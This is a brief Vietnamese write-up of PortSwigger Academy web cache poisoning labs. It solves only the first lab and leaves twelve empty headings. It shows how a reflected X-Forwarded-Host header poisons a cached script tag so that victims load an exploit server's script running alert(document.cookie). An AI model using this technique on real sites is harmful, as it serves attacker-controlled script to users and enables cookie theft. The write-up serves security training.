# 1. Web cache poisoning with an unkeyed header
Nhận thấy `Host` HTTP header được reflected trong đoạn tracker script:

```
<script type="text/javascript" src="//0a67006403f76056c172df6000b30077.web-security-academy.net/resources/js/tracking.js"></script>
```
Thử thêm header `X-Forwarded-Host: abc.com` thì thấy đoạn script trở thành:
```
<script type="text/javascript" src="//abc.com/resources/js/tracking.js"></script>
```
Và server sẽ lưu cache trong thời gian 30s. Như vậy, để thực thi đoạn script `alert(document.cookie)`, ta vào exploit server và cấu hình đoạn body `alert(document.cookie)`, với header `Content-Type: application/javascript`, sau đó để path là `/resources/js/tracking.js`.

Submit request với header `X-Forwarded-Host: https://exploit-0aa1003b03e760a1c112deb4012a0067.exploit-server.net`. Kết quả thành công.

# 2. Web cache poisoning with an unkeyed cookie

# 3. Web cache poisoning with multiple headers

# 4. Targeted web cache poisoning using an unknown header

# 5. Web cache poisoning via an unkeyed query string

# 6. Web cache poisoning via an unkeyed query parameter

# 7. Parameter cloaking

# 8. Web cache poisoning via a fat GET request

# 9. URL normalization

# 10. Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria

# 11. Combining web cache poisoning vulnerabilities

# 12. Cache key injection

# 13. Internal cache poisoning

